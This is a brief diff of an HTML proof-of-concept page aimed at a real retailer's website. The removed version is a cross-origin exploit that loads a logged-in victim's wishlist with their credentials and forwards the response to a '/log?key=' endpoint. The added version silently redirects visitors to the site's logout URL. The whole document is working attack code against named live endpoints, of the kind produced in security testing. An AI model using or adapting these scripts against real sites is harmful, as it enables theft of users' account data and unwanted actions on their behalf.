@@ -6,16 +6,8 @@
   <title>Document</title>
 </head>
 <body>
-  <script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://www.globus-baumarkt.de/pixup/wishlist',true);
-    req.withCredentials = true;
-    req.send();
-
-    function reqListener() {
-        location='/log?key='+this.responseText;
-    };
-</script>
+	<script>
+		window.location.href="https://www.globus-baumarkt.de/account/logout"
+	</script>
 </body>
 </html>
